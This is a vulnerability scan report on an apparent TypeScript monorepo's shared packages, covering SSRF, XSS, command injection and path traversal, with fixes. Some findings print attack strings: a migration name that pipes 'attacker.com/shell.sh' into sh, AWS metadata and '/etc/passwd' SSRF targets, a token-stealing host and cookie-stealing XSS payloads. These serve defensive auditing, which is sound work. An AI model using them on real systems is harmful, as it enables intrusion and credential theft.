# Vulnerability Scan Report: Shared Utility Packages

**Scan Date:** 2026-03-24
**Scanner:** Deep manual code analysis + pattern matching
**Scope:** `packages/ui/`, `packages/utils/`, `packages/logger/`, `packages/med-ner/`, `packages/pipeline/`, `packages/tools/`

---

## Executive Summary

| Severity | Count | Description |
|----------|-------|-------------|
| **CRITICAL** | 3 | SSRF via unvalidated model URLs, predictable UUID generation, unverified model checksums |
| **HIGH** | 10 | Command injection, XSS via innerHTML, path traversal, symlink attacks, arbitrary code execution via dynamic import |
| **MEDIUM** | 14 | Log injection/forging, unsanitized hrefs, CSS injection, token leakage, weak JWT validation |
| **LOW** | 12 | Information leakage, missing input guards, overly permissive validation, auto-load side effects |
| **INFO** | 6 | Architectural notes, positive findings |

**Total Findings: 45**

---

## Table of Contents

1. [Package Overview](#1-package-overview)
2. [CRITICAL Findings](#2-critical-findings)
3. [HIGH Findings](#3-high-findings)
4. [MEDIUM Findings](#4-medium-findings)
5. [LOW Findings](#5-low-findings)
6. [Dependency Analysis](#6-dependency-analysis)
7. [ReDoS Analysis](#7-redos-analysis)
8. [Prototype Pollution Analysis](#8-prototype-pollution-analysis)
9. [Positive Security Findings](#9-positive-security-findings)
10. [Remediation Priorities](#10-remediation-priorities)

---

## 1. Package Overview

| Package | Dependencies (Runtime) | Source Files | Primary Risk Surface |
|---------|----------------------|-------------|---------------------|
| `@arcaai/ui` | 66 | ~1,224 | XSS, CSS injection, component library attack surface |
| `@arcaai/utils` | 1 (`@arcaai/types`) | 16 | SSRF, insecure randomness, incomplete escaping |
| `@arcaai/logger` | 3 (winston stack) | 1 (245 lines) | Log injection/forging, path traversal in file transports |
| `@arcaai/med-ner` | 1 (`@huggingface/transformers`) | 9 | Model loading deserialization, XSS in highlight output |
| `@arcaai/pipeline` | 1 (`eventemitter3`) | 7 | Minimal — in-process only, no serialization |
| `@arcaai/tools` | 12 | 69 | Command injection, path traversal, symlink attacks |

---

## 2. CRITICAL Findings

### CRIT-01: SSRF via Unvalidated Model Download URLs

**Package:** `@arcaai/utils`
**Files:** `ModelDownloader.ts:78`, `ModelLoader.ts:149`, `ModelLoader.ts:205`, `ModelSourceManager.ts:46-51`
**CVSS Estimate:** 9.1

**Description:** The model loading pipeline fetches URLs with zero validation. `ModelDownloader.downloadModel()` calls `fetch(config.url)` directly. `ModelLoader.loadFromUrl()` and `loadFromPath()` do the same. `ModelSourceManager.setCustomSource()` accepts arbitrary URLs that flow into this pipeline.

**Attack Vectors:**
- `file:///etc/passwd` (local file access in Node.js/Electron)
- `http://169.254.169.254/latest/meta-data/` (AWS IMDS credential theft)
- `http://127.0.0.1:8868/api/admin/users` (internal API access)
- `http://[::1]/` (IPv6 loopback bypass)

**Proof of Concept:**
```typescript
const manager = new ModelSourceManager();
manager.setCustomSource("silero-vad", "http://169.254.169.254/latest/meta-data/iam/security-credentials/");
const source = await manager.getBestSource("silero-vad", config);
// source.url now points to AWS metadata → fetch() retrieves cloud credentials
```

**Additionally:** `ModelSourceManager.downloadFromHuggingFace()` sends the HuggingFace Bearer token to whatever URL is constructed from the `repo` field. A crafted `repo.repo` value like `evil.com/steal-token` would exfiltrate the token.

**Remediation:**
1. URL allowlist: validate scheme is `https:` only (or `http:` for dev with explicit flag)
2. Host validation: reject private IPs (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x, `[::1]`, `[fc00::]`)
3. For HuggingFace: verify parsed URL host is exactly `huggingface.co` before sending auth headers
4. For custom sources: require explicit opt-in for non-CDN URLs

---

### CRIT-02: Predictable UUID/Random String Generation via `Math.random()`

**Package:** `@arcaai/utils`
**File:** `string.ts:54-72`
**CVSS Estimate:** 8.5 (if used for security-sensitive identifiers)

**Description:** Both `randomString()` and `generateUUID()` use `Math.random()`, which is a non-cryptographic PRNG (xorshift128+ in V8). An attacker who observes 3-5 outputs can reconstruct the internal state and predict all future values.

**Code:**
```typescript
// string.ts:66-72
export function generateUUID(): string {
  return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, (c) => {
    const r = (Math.random() * 16) | 0;  // PREDICTABLE
    const v = c === 'x' ? r : (r & 0x3) | 0x8;
    return v.toString(16);
  });
}
```

**Impact:** If these functions are used for session tokens, API keys, CSRF tokens, correlation IDs, or any security boundary, the values are guessable. Currently only referenced in test files, but they are exported and available to all consumers.

**Remediation:**
```typescript
export function generateUUID(): string {
  return crypto.randomUUID(); // Web Crypto API / Node 19+
}

export function randomString(length: number): string {
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  const values = new Uint8Array(length);
  crypto.getRandomValues(values);
  return Array.from(values, v => chars[v % chars.length]).join('');
}
```

---

### CRIT-03: Model Integrity — Checksum Defined But Never Verified

**Package:** `@arcaai/utils`
**File:** `ModelDownloader.ts:15-16` (definition) vs `ModelDownloader.ts:121-142` (validation)
**CVSS Estimate:** 8.2

**Description:** `ModelConfig` defines an optional `checksum?: string` field documented as "SHA-256 checksum", but the `downloadModel()` method never verifies it. The only validation is checking if the first byte is `0x08` (ONNX magic byte), which is trivially satisfied by any file starting with that byte.

**Impact:** A MITM attack or CDN compromise can substitute a malicious model file. The file will be accepted and cached in IndexedDB if the first byte is `0x08`. Subsequent loads from cache also perform no integrity verification, enabling persistent cache poisoning.

**Remediation:**
```typescript
if (config.checksum) {
  const hash = await crypto.subtle.digest('SHA-256', arrayBuffer);
  const hex = Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
  if (hex !== config.checksum) {
    throw new Error(`Checksum mismatch: expected ${config.checksum}, got ${hex}`);
  }
}
```

---

## 3. HIGH Findings

### HIGH-01: Command Injection via `child_process.exec()` in Tools

**Package:** `@arcaai/tools`
**Files:** `runCommand.ts:1-22`, `activities.ts:53,83,106,143`
**CVSS Estimate:** 8.8 (local privilege escalation)

**Description:** `runCommand()` wraps `child_process.exec()` which spawns a shell. All callers in `activities.ts` interpolate `relativeSchemaPath` and `migrationName` directly into command strings without sanitization.

**Vulnerable Pattern:**
```typescript
// activities.ts:106
const command = `pnpm exec prisma migrate dev --schema=${relativeSchemaPath} --name=${name}`;
await runCommand({ command, cwd: monorepoRoot });
```

**Attack Vector:** A migration name like `foo$(curl attacker.com/shell.sh|sh)` or a directory containing shell metacharacters would execute arbitrary commands.

**Remediation:** Replace `exec()` with `execFile()` or `spawn()` using argument arrays:
```typescript
import { execFile } from 'child_process';
await execFileAsync('pnpm', ['exec', 'prisma', 'migrate', 'dev', `--schema=${path}`, `--name=${name}`], { cwd });
```

---

### HIGH-02: XSS via `innerHTML` Injection in `cool-mode.tsx`

**Package:** `@arcaai/ui`
**File:** `registries/magicui/cool-mode.tsx:105,110`
**CVSS Estimate:** 7.5

**Description:** The `particleType` prop value is interpolated directly into `innerHTML` without any escaping or sanitization.

**Vulnerable Code:**
```typescript
// cool-mode.tsx:105
particle.innerHTML = `<img src="${particleType}" width="${size}" ...>`;
// cool-mode.tsx:110
particle.innerHTML = `<div ...>${particleType}</div>`;
```

**Exploit:** If `particleType` is `"><img src=x onerror=alert(document.cookie)>`, it breaks out of the `src` attribute and injects an arbitrary event handler.

**Remediation:** Use DOM APIs instead of `innerHTML`:
```typescript
const img = document.createElement('img');
img.src = particleType; // setAttribute is safe
img.width = size;
img.height = size;
particle.appendChild(img);
```

---

### HIGH-03: XSS in `highlightEntities()` — Unescaped HTML Output

**Package:** `@arcaai/med-ner`
**File:** `utils/entityUtils.ts:238-257`
**CVSS Estimate:** 7.5

**Description:** `highlightEntities()` builds HTML via string concatenation. The entity text, entity type, and class prefix are interpolated directly without HTML escaping.

**Vulnerable Code:**
```typescript
// entityUtils.ts:253
result = `${before}<span class="${classPrefix} ${typeClass}" data-entity-type="${entity.type}" data-score="${entity.score.toFixed(2)}">${entityText}</span>${after}`;
```

**XSS Vectors:**
1. `entityText` containing `<script>alert(1)</script>` → direct script injection
2. `entity.type` containing `" onclick="alert(1)` → attribute breakout
3. `classPrefix` containing `" onclick="alert(1)` → same

**Remediation:** HTML-escape all interpolated values before insertion, or use DOM APIs (`document.createElement`, `textContent`).

---

### HIGH-04: Path Traversal via Unsanitized Domain Names in Tools

**Package:** `@arcaai/tools`
**Files:** `paths.ts:126-155,161-174,180-205`, all `generate-*` directories
**CVSS Estimate:** 7.8

**Description:** All `getDomain*Path()` methods pass the `domain` parameter directly to `path.resolve()`. A domain name like `../../etc` or `../../../home/user/.ssh` resolves outside the intended directory tree, enabling arbitrary directory creation and file writing.

**Vulnerable Code:**
```typescript
// paths.ts:126-128
static getDomainEntitiesPath(domain: string): string {
  return path.resolve(this.getEntitiesPath(), domain);
}
```

**Combined with:**
- `generateIndexFile()` (line 222) which writes files
- `ensureDirectoryExists()` (line 210) which creates directories
- `clearDirectory()` which recursively deletes directories

**Remediation:** Validate domain names against `/^[a-z][a-z0-9_-]*$/i` and verify resolved paths stay within the expected base directory:
```typescript
const resolved = path.resolve(base, domain);
if (!resolved.startsWith(base)) throw new Error('Path traversal detected');
```

---

### HIGH-05: Symlink-Following Recursive Deletion in `clearDirectory()`

**Package:** `@arcaai/tools`
**File:** `clearDirectory.ts:4-8`
**CVSS Estimate:** 7.5

**Description:** `rimraf.sync(outputPath)` follows symbolic links. A symlink in a generated output directory pointing to system directories would cause recursive deletion of those targets.

**Remediation:**
1. Resolve `outputPath` with `fs.realpathSync()` before deletion
2. Verify the resolved path is within the expected workspace root
3. Consider `fs.rm(path, { recursive: true, force: true })` (Node 16+) which has more predictable symlink behavior

---

### HIGH-06: Arbitrary Code Execution via Dynamic `import()` in `getPrismaDMMF.ts`

**Package:** `@arcaai/tools`
**File:** `getPrismaDMMF.ts:49`
**CVSS Estimate:** 8.0

**Description:** `await import(resolvedPath)` executes whatever JavaScript module exists at the resolved path with full Node.js privileges. The `checkDirectory()` guard only verifies the path is a directory (following symlinks), not that it's within the expected Prisma client location.

**Remediation:** Validate that the resolved path matches `node_modules/.prisma/*/` or an expected Prisma output directory pattern before importing.

---

### HIGH-07: `isValidUrl()` Accepts All Schemes — No SSRF Protection

**Package:** `@arcaai/utils`
**File:** `validation.ts:16-23`
**CVSS Estimate:** 7.5 (context-dependent)

**Description:** Uses `new URL()` without scheme validation. Accepts `file://`, `javascript:`, `gopher://`, `ftp://`, internal IPs, and cloud metadata endpoints.

**Remediation:**
```typescript
export function isValidUrl(url: string, allowedSchemes = ['https:', 'http:']): boolean {
  try {
    const parsed = new URL(url);
    return allowedSchemes.includes(parsed.protocol);
  } catch {
    return false;
  }
}
```

---

### HIGH-08: HuggingFace Token Exfiltration via Crafted Repo

**Package:** `@arcaai/utils`
**File:** `ModelSourceManager.ts:169-180`
**CVSS Estimate:** 7.8

**Description:** The `downloadFromHuggingFace()` method constructs a URL from user-supplied `repo` fields and sends the configured `huggingFaceToken` as a Bearer token in the request headers. If an attacker controls the `repo.repo` field, they can direct the request to their own server and capture the token.

**Remediation:** After constructing the URL via `buildHuggingFaceUrl()`, verify `new URL(url).hostname === 'huggingface.co'` before attaching the Authorization header.

---

### HIGH-09: Symlink Following in All File Operations (Package-Wide)

**Package:** `@arcaai/tools`
**Files:** All files using `fs.statSync`, `fs.readdirSync`, `fs.writeFileSync`, `rimraf.sync`
**CVSS Estimate:** 6.5

**Description:** No file in `@arcaai/tools` uses `lstat`, `lstatSync`, `readlink`, or `realpathSync`. All filesystem operations follow symlinks by default. This affects:
- `exportFromDirectory.ts` — recursive traversal and file writing
- `paths.ts` — `generateIndexFile()` recursive index generation
- `clearDirectory.ts` — recursive deletion
- All `generate-*` generators — file reading and writing

**Remediation:** Use `fs.lstatSync()` to detect symlinks before operating. Resolve with `fs.realpathSync()` and validate containment.

---

### HIGH-10: Custom HTML Sanitizer Instead of DOMPurify

**Package:** `@arcaai/ui`
**File:** `registries/manifest/post-detail.tsx:11-62`
**CVSS Estimate:** 7.0

**Description:** `post-detail.tsx` implements a custom DOM-based HTML sanitizer with an allowlist of tags and attributes. While well-structured, custom sanitizers are historically prone to bypass via:
- **mXSS** (mutation-based XSS): browser parsing differences between `DOMParser` and actual rendering
- **Browser-specific quirks**: edge cases in HTML5 parsing
- **SSR bypass**: line 58 returns raw unsanitized HTML when `typeof document === 'undefined'`

**Remediation:** Replace the custom sanitizer with DOMPurify, which handles mXSS, is actively maintained, and has been battle-tested against thousands of bypass attempts:
```typescript
import DOMPurify from 'dompurify';
const sanitized = DOMPurify.sanitize(html, { ALLOWED_TAGS: [...], ALLOWED_ATTR: [...] });
```

---

## 4. MEDIUM Findings

### MED-01: Log Injection — No Message Sanitization

**Package:** `@arcaai/logger`
**File:** `index.ts:143-150`

The `printf` formatter interpolates `message`, `service`, and metadata directly into output strings with zero sanitization. An attacker who controls log input can:
- Inject ANSI escape codes (`\x1b[31mFAKE ERROR\x1b[0m`) to manipulate terminal output
- Overwrite previous log lines (`\x1b[1A\x1b[2K`)
- Inject fake log entries with crafted timestamps/levels in plaintext mode
- In JSON mode (`format.json: true`), inject additional fields via metadata objects

**Remediation:** Strip or escape ANSI codes and control characters from log messages:
```typescript
function sanitizeLogMessage(msg: string): string {
  return msg.replace(/[\x00-\x1F\x7F-\x9F]/g, '').replace(/\x1b\[[0-9;]*m/g, '');
}
```

---

### MED-02: Log File Path Traversal

**Package:** `@arcaai/logger`
**File:** `index.ts:162-183`

`filename` and `dirname` for file and rotating transports are passed directly to Winston with no path validation. If these values come from user-influenced configuration, log files could be written to arbitrary filesystem locations.

**Remediation:** Validate that `dirname` resolves within an allowed log directory. Use `path.resolve()` + containment check.

---

### MED-03: Unsanitized `href` Props in UI Components

**Package:** `@arcaai/ui`
**Files:** `prompt-kit/source.tsx:61,103`, `ai-elements/sources.tsx:66`, `manifest/post-detail.tsx:459`

These components pass `href` props directly to `<a>` elements without calling `sanitizeHref()`. A `javascript:alert(1)` URL would be rendered as a clickable link.

**Contrast:** `tool-ui/citation/citation.tsx`, `tool-ui/link-preview/link-preview.tsx`, and `tool-ui/data-table/formatters.tsx` all correctly use `sanitizeHref()`.

**Remediation:** Apply `sanitizeHref()` (from `tool-ui/shared/media/sanitize-href.ts`) to all dynamic `href` props before rendering.

---

### MED-04: CSS Injection via Chart Style Injection

**Package:** `@arcaai/ui`
**File:** `shadcn/chart.tsx:80-101`

`ChartStyle` component injects a `<style>` element via `dangerouslySetInnerHTML`. The `color` values from `ChartConfig` are interpolated into CSS without escaping. If `color` values were sourced from user input, an attacker could inject CSS like `red; } body { display: none }` or use CSS-based data exfiltration.

**Remediation:** Validate color values against a CSS color pattern (hex, rgb, hsl, named colors) before interpolation.

---

### MED-05: `escapeHtml()` Missing Characters

**Package:** `@arcaai/utils`
**File:** `string.ts:84-93`

The function escapes `& < > " '` but omits:
- **Null bytes** (`\x00`): can truncate strings in C-based parsers
- **Backtick** (`` ` ``): can delimit attributes in older IE
- **Forward slash** (`/`): OWASP recommends escaping to prevent `</script>` tag closing

Additionally, no null/undefined guard exists — calling with a non-string value will throw.

**Remediation:**
```typescript
export function escapeHtml(str: string): string {
  if (typeof str !== 'string') return '';
  const escapes: Record<string, string> = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;',
    "'": '&#39;', '`': '&#96;', '/': '&#x2F;',
  };
  return str.replace(/\x00/g, '').replace(/[&<>"'`\/]/g, c => escapes[c]);
}
```

---

### MED-06: ANSI-to-React XSS Risk in Terminal Components

**Package:** `@arcaai/ui`
**Files:** `tool-ui/terminal/terminal.tsx:4,139,144`, `ai-elements/terminal.tsx:7,269`

The `ansi-to-react` library converts ANSI escape codes to React elements. Historically, ANSI-to-HTML converters have had XSS vulnerabilities via crafted escape sequences (e.g., hyperlink sequences `\e]8;;javascript:alert(1)\e\\`). The `stdout`/`stderr`/`output` values come from external command output which could be attacker-influenced.

**Remediation:** Audit `ansi-to-react` version for known CVEs. Consider pre-stripping unknown/dangerous ANSI escape sequences before rendering.

---

### MED-07: Weak JWT Secret Validation in Dev Token Generator

**Package:** `@arcaai/tools`
**File:** `gen-dev-token/generate.ts:45-52`

Only issues a warning for JWT secrets < 32 characters — execution continues. NIST recommends >= 256 bits of key material for HMAC-SHA256.

Additionally:
- No explicit algorithm pinning (`algorithm: 'HS256'`) in `jwt.sign()` (line 115)
- No maximum expiry validation — `999y` creates an effectively non-expiring token

**Remediation:** Hard-fail for secrets < 32 characters. Pin algorithm explicitly. Cap maximum expiry.

---

### MED-08: Arbitrary Model Loading Without Allowlist in Med-NER

**Package:** `@arcaai/med-ner`
**File:** `MedNERProcessor.ts:164-168,216-217`

The `model` option accepts any string. If it doesn't match `MODEL_MAP`, the raw string is passed to `@huggingface/transformers` `pipeline()`, allowing loading of any HuggingFace model.

**Remediation:** Reject unknown model IDs or require explicit opt-in for custom models:
```typescript
if (!MODEL_MAP[model]) {
  throw new MedNERError(MedNERErrorCode.INVALID_CONFIG, `Unknown model: ${model}. Use 'default', 'biomedical', or 'clinical'.`);
}
```

---

### MED-09: `ModelSourceManager.parseHuggingFaceRepo()` — No Input Sanitization

**Package:** `@arcaai/utils`
**File:** `ModelSourceManager.ts:99-117`

The `repoPath` is not validated against a pattern. Inputs like `../../etc/passwd:model.onnx` produce a URL with path traversal. While `fetch()` should normalize this, some proxies or servers may not.

---

### MED-10: `ModelSourceManager.validateUrl()` — HEAD Request SSRF

**Package:** `@arcaai/utils`
**File:** `ModelSourceManager.ts:156-163`

Even a HEAD request to an internal service leaks information (existence and response status). Uses `fetch()` with no URL validation.

---

### MED-11: Monorepo Root Fallback in Tools Walks 5 Levels Up

**Package:** `@arcaai/tools`
**File:** `activities.ts:13-20`

The `getMonorepoRoot()` function walks 5 levels up when it can't find a `packages` directory. A crafted `schemaPath` could cause `cwd` for command execution to be set to an attacker-controlled directory.

---

### MED-12: `addTransport()` Accepts Arbitrary Transports

**Package:** `@arcaai/logger`
**File:** `index.ts:198-200`

The method allows arbitrary Winston transports to be added post-construction with no validation. If called with an attacker-controlled transport, it could exfiltrate all log data.

---

### MED-13: Lexical Editor Serialized State From Props

**Package:** `@arcaai/ui`
**File:** `registries/shadcn-editor/editor.tsx:38-45`

The editor accepts `editorSerializedState` and passes it to Lexical's `initialConfig`. If this state comes from an untrusted source, Lexical will deserialize and render it. Currently safe with the minimal node set (text/heading/quote only), but becomes an XSS vector if custom nodes (Image, Link, Iframe) are added later.

---

### MED-14: ModelLoader Cache Poisoning

**Package:** `@arcaai/utils`
**File:** `ModelLoader.ts` (cache flow)

Downloaded models are cached in IndexedDB with no integrity checks on subsequent loads. If an attacker injects a malicious model into IndexedDB (via XSS, browser extension, or shared device), all subsequent loads will use the poisoned model.

---

## 5. LOW Findings

### LOW-01: No Download Size Limit in `ModelDownloader`

**File:** `ModelDownloader.ts`
A malicious model URL could serve an enormous file, causing memory exhaustion (DoS).

### LOW-02: Information Leakage in Model Download Logs

**File:** `ModelDownloader.ts:71,75,124-126,135-136`
Model URLs, sizes, and raw byte data are logged to console.

### LOW-03: Email Validation Regex Overly Permissive

**File:** `validation.ts:9`
Accepts `"><script>alert(1)</script>"@example.com`. No max length enforcement.

### LOW-04: `formatFileSize()` Out-of-Bounds Array Access

**File:** `format.ts:8-18`
Extreme input values produce `units[102]` = `undefined`.

### LOW-05: Hardcoded Default Tenant UUID in API Key Generator

**File:** `gen-api-key/generate.ts:106`
`50000000-0000-0000-0000-000000000000` used for all SDK keys without explicit tenant.

### LOW-06: Raw API Key Returned (Log Leak Risk)

**File:** `gen-api-key/generate.ts:98`
`CreateApiKeyResult` returns `rawKey` which could be persisted to logs.

### LOW-07: Auto-Load Side Effect in `loadEnv.ts`

**File:** `loadEnv.ts:109`
`loadToolsEnv()` runs automatically on import, which can cause surprising behavior in test environments.

### LOW-08: `JSON.parse` Without Try-Catch in Controller Generator

**File:** `generate-controller/index.ts:193,230`
Parses data from inquirer prompt choices without error handling.

### LOW-09: SSR Sanitizer Bypass in `post-detail.tsx`

**File:** `manifest/post-detail.tsx:58`
`sanitizeHtml()` returns raw unsanitized HTML when `typeof document === 'undefined'`. While `rsc: false` is set, any SSR path would bypass sanitization entirely.

### LOW-10: `env.allowLocalModels = false` Only Set in Browser

**File:** `MedNERProcessor.ts:40-43`
Local model loading is only disabled when `typeof window !== 'undefined'`. Node.js/test environments remain unprotected.

### LOW-11: No Max Input Length in `MedNERProcessor.extract()`

**File:** `MedNERProcessor.ts:274-287`
No maximum length rejection before chunking. Excessively large text could cause memory exhaustion.

### LOW-12: `exportFromDirectory.ts` Symlink Following

**File:** `exportFromDirectory.ts:17,31`
Recursive traversal and file writing via `fs.statSync` follows symlinks without detection.

---

## 6. Dependency Analysis

### `@arcaai/ui` — 66 Production Dependencies

| Dependency | Version | Known Concerns |
|------------|---------|----------------|
| `@radix-ui/*` (20+ packages) | ^1.x-2.x | No known CVEs as of 2026-03. Well-maintained, accessibility-focused. |
| `recharts` | 2.15.4 (pinned) | No known XSS CVEs. Labels rendered via React JSX (auto-escaped). |
| `framer-motion` / `motion` | ^12.38.0 | No known CVEs. Animation library with no HTML rendering. |
| `react-hook-form` | ^7.72.0 (devDep) | No known CVEs. Form state management only — no HTML rendering. |
| `zod` | ^4.3.6 | No known CVEs. Schema validation library. |
| `cmdk` | ^1.1.1 | No known CVEs. Command palette component. |
| `sonner` | ^2.0.7 | No known CVEs. Toast notification library. |
| `lucide-react` | ^1.0.1 | No known CVEs. Icon library with SVG rendering. |
| `marked` | ^17.0.5 | **Note:** Only used for tokenizing (`marked.lexer`), not HTML rendering. Safe. |
| `react-markdown` | ^10.1.0 | Used **without** `rehype-raw` plugin. Safe — raw HTML not rendered. |
| `ansi-to-react` | ^6.2.6 | **Potential:** ANSI escape sequence XSS vectors. Audit version. |
| `shiki` | ^4.0.2 | Code highlighting. Input is escaped before HTML generation. |
| `handlebars` | N/A (in `@arcaai/tools`) | ^4.7.8 — **Known prototype pollution CVE-2021-23369** (fixed in 4.7.7+). Version is safe. |
| `@lexical/*` | ^0.42.0 | No HTML import/export plugins loaded. Minimal node set limits risk. |
| `@react-three/fiber` | ^9.5.0 | No model loading from user URLs. Hardcoded shaders only. |
| `leaflet` / `react-leaflet` | ^1.9.4 / ^5.0.0 | `setDOMContent` + React portals used (not `setHTML`). Safe. |
| `maplibre-gl` | ^5.21.0 | Same safe pattern via React portals. |
| `ai` (Vercel AI SDK) | ^6.0.135 | Streaming SDK. No known CVEs. |
| `@elevenlabs/client` | ^0.15.2 | TTS integration. No HTML rendering. |
| `@dnd-kit/*` | Various ^6-10 | Drag-and-drop. No HTML injection vectors. |

### `@arcaai/utils` — 1 Dependency

| Dependency | Version | Status |
|------------|---------|--------|
| `@arcaai/types` | workspace:* | Internal — no external CVE risk |

### `@arcaai/logger` — 3 Dependencies

| Dependency | Version | Status |
|------------|---------|--------|
| `winston` | ^3.19.0 | No known CVEs. Core logging framework. |
| `winston-daily-rotate-file` | ^5.0.0 | No known CVEs. |
| `winston-s3-transport` | ^2.1.2 | Imported but S3 transport not actively configured. |

### `@arcaai/med-ner` — 1 Dependency

| Dependency | Version | Status |
|------------|---------|--------|
| `@huggingface/transformers` | ^3.8.1 | ML inference. Model loading from HuggingFace Hub. See CRIT-01, MED-08. |

### `@arcaai/pipeline` — 1 Dependency

| Dependency | Version | Status |
|------------|---------|--------|
| `eventemitter3` | ^5.0.4 | No known CVEs. Minimal event emitter. |

### `@arcaai/tools` — 12 Dependencies

| Dependency | Version | Known Concerns |
|------------|---------|----------------|
| `@prisma/client` | ^7.5.0 | No known CVEs. ORM client. |
| `handlebars` | ^4.7.8 | **CVE-2021-23369** fixed in 4.7.7+. Current version safe. |
| `pg` | ^8.20.0 | No known CVEs. PostgreSQL client. Parameterized queries used correctly. |
| `ts-morph` | ^21.0.1 | TypeScript AST manipulation. No security concerns. |
| `glob` | ^10.5.0 | No known CVEs. File globbing. |
| `inquirer` | ^8.2.7 | CLI prompt library. No security concerns. |
| `commander` | ^12.1.0 | CLI framework. No security concerns. |
| `jsonwebtoken` | ^9.0.3 (devDep) | No known CVEs in 9.x. Algorithm confusion mitigated in 9.x. |
| `chalk` | ^4.1.2 | Terminal coloring. CJS version (ESM migration not needed). |

---

## 7. ReDoS Analysis

### Comprehensive Regex Scan Results

All regex patterns across `@arcaai/utils`, `@arcaai/med-ner`, `@arcaai/pipeline`, and `@arcaai/tools` were analyzed for catastrophic backtracking (nested quantifiers, overlapping character classes with repetition).

**Result: No ReDoS vulnerabilities found.**

| Package | Regex Count | Patterns | Verdict |
|---------|------------|----------|---------|
| `@arcaai/utils` | 10 | Character classes with single quantifiers, anchored patterns | **Safe** |
| `@arcaai/med-ner` | 4 | Simple literals, bounded input (`navigator.userAgent`) | **Safe** |
| `@arcaai/pipeline` | 0 | No regex in production code | **N/A** |
| `@arcaai/tools` | 30+ | Fixed-length quantifiers, character classes, no nested groups | **Safe** |

Notable safe patterns:
- `validation.ts:9`: `/^[^\s@]+@[^\s@]+\.[^\s@]+$/` — negated character classes prevent overlap
- `validation.ts:44`: `/^[0-9a-f]{8}-[0-9a-f]{4}-...$/i` — fixed-length quantifiers
- `browserSupport.ts:64`: `/^((?!chrome|android).)*safari/i` — negative lookahead on bounded input (~200 chars max)
- All `tools/utils/*.ts` name conversion patterns use simple character class + quantifier combinations

**No `new RegExp()` with dynamic user input** was found in any package.

---

## 8. Prototype Pollution Analysis

### Result: No Prototype Pollution Vulnerabilities Found

| Pattern Searched | Packages Checked | Findings |
|-----------------|-----------------|----------|
| `Object.create()` | All 6 | None |
| `__proto__` | All 6 | None |
| `constructor.prototype` | All 6 | None |
| `Object.setPrototypeOf()` | All 6 | None |
| `Object.getPrototypeOf()` | All 6 | None |
| Deep clone/merge utilities | All 6 | None (only 1 shallow spread found in `ModelSourceManager.ts:40`) |
| `Object.assign()` with dynamic keys | All 6 | None |
| `structuredClone()` | All 6 | None |

**Note:** `handlebars` ^4.7.8 (in `@arcaai/tools`) historically had prototype pollution vulnerabilities (CVE-2021-23369) but the version in use includes the fix.

---

## 9. Positive Security Findings

### POS-01: `sanitize-href.ts` — Well-Implemented URL Sanitizer

`tool-ui/shared/media/sanitize-href.ts` implements an allowlist-based URL sanitizer that blocks `javascript:`, `data:`, `vbscript:` and all non-http(s) protocols. Handles protocol-relative URLs and control characters. Used correctly by `citation.tsx`, `link-preview.tsx`, `data-table/formatters.tsx`, and `gallery-lightbox.tsx`.

### POS-02: SQL Queries Use Parameterized Inputs

`gen-api-key/generate.ts` uses parameterized queries (`$1` through `$12`) for all database operations. No SQL injection risk.

### POS-03: Crypto Key Generation Uses CSPRNG

`gen-api-key/generate.ts` correctly uses `crypto.randomBytes(32)` and `crypto.randomUUID()` for API key generation.

### POS-04: Map Components Use Safe DOM Rendering

`mapcn/map.tsx` uses `setDOMContent()` + React `createPortal()` for all popup/tooltip/marker content, avoiding MapLibre's dangerous `setHTML()` method.

### POS-05: `react-markdown` Used Without `rehype-raw`

`prompt-kit/markdown.tsx` renders markdown without the `rehype-raw` plugin, which means raw HTML in markdown is not rendered — the safe default.

### POS-06: Pipeline Package Has Minimal Attack Surface

`@arcaai/pipeline` has zero regex, zero `JSON.parse`, zero `eval`, zero `child_process`, zero filesystem operations, zero serialization. Stages must be concrete TypeScript class instances. Only 1 runtime dependency.

---

## 10. Remediation Priorities

### P0 — Immediate (Critical/High, Exploitable Now)

| ID | Finding | Fix Effort | Impact |
|----|---------|-----------|--------|
| CRIT-01 | SSRF in model loading pipeline | Medium | URL allowlist + host validation in `ModelDownloader`, `ModelLoader`, `ModelSourceManager` |
| CRIT-02 | Predictable UUIDs via `Math.random()` | Low | Replace with `crypto.randomUUID()` / `crypto.getRandomValues()` |
| CRIT-03 | Checksum never verified | Low | Implement SHA-256 verification using `crypto.subtle.digest()` |
| HIGH-01 | Command injection in tools | Medium | Replace `exec()` with `execFile()`/`spawn()` using argument arrays |
| HIGH-02 | `cool-mode.tsx` innerHTML XSS | Low | Use DOM APIs instead of `innerHTML` |
| HIGH-03 | `highlightEntities()` XSS | Low | HTML-escape all interpolated values |

### P1 — Short-Term (High/Medium, Defense in Depth)

| ID | Finding | Fix Effort | Impact |
|----|---------|-----------|--------|
| HIGH-04 | Path traversal in tools | Medium | Domain name validation + containment check |
| HIGH-05 | Symlink following deletion | Low | `realpathSync()` + containment check before `rimraf` |
| HIGH-06 | Dynamic `import()` without boundary | Low | Path allowlist validation |
| HIGH-07 | `isValidUrl()` no scheme check | Low | Add scheme allowlist parameter |
| HIGH-08 | HF token exfiltration | Low | Verify URL host before sending auth header |
| HIGH-10 | Custom HTML sanitizer | Medium | Replace with DOMPurify |
| MED-01 | Log injection | Low | Strip ANSI/control characters from messages |
| MED-03 | Unsanitized hrefs | Low | Apply `sanitizeHref()` to all dynamic href props |

### P2 — Medium-Term (Medium, Hardening)

| ID | Finding | Fix Effort | Impact |
|----|---------|-----------|--------|
| MED-02 | Log file path traversal | Low | Validate dirname containment |
| MED-04 | CSS injection in charts | Low | Validate color values |
| MED-05 | Incomplete `escapeHtml()` | Low | Add missing characters, null guard |
| MED-07 | Weak JWT secret validation | Low | Hard-fail + algorithm pinning |
| MED-08 | Arbitrary model loading | Low | Model ID allowlist |
| HIGH-09 | Symlink following (package-wide) | Medium | Audit all fs operations, use `lstatSync` |
| MED-14 | Cache poisoning | Medium | Integrity check on cached model loads |

### P3 — Long-Term (Low, Robustness)

| ID | Finding | Fix Effort | Impact |
|----|---------|-----------|--------|
| LOW-01 | No download size limit | Low | Add max size parameter to `ModelDownloader` |
| LOW-03 | Permissive email regex | Low | Tighten pattern or use dedicated library |
| LOW-10 | Local models in Node.js | Low | Set `allowLocalModels = false` unconditionally |
| LOW-11 | No max input length in NER | Low | Add configurable max length with rejection |
